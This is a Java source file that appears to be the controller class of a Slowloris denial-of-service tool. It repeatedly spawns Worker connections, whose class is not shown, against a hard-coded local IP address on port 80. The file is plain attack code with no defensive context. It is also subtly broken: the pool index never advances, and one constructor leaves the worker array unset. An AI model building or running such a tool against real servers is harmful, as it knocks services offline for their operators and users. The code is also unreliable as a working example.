package slowLoris;
import slowLoris.Worker;
import java.net.*;
import java.io.*;
class SlowLoris {
  private String address;
  private int port=80;
  private int threads = 25;
  private Worker[] workers;
  public String[] initialPaths = {"/index.html","/","/favicon.ico"};
  public SlowLoris(String address, int port){
    this.address = address;
    this.port = port;
    this.workers = new Worker[threads];
  }
  public SlowLoris(String address){
    this.address = address;
  }
  public void poolWorkers(){
    int index = 0;
    while(true){
      try{
        if(workers[index] == null){
          workers[index] = new Worker(address,port,initialPaths[index%initialPaths.length]);
        }else if(!workers[index].active){
          workers[index] = new Worker(address,port,initialPaths[index%initialPaths.length]);
        }
      }catch(UnknownHostException  e){
        System.out.println(e);
        break;
      }
    }
  }
  public static void main(String args[]){
    SlowLoris s = new SlowLoris("192.168.0.119",80);
    s.poolWorkers();
    System.out.println("Exited");
  }
}
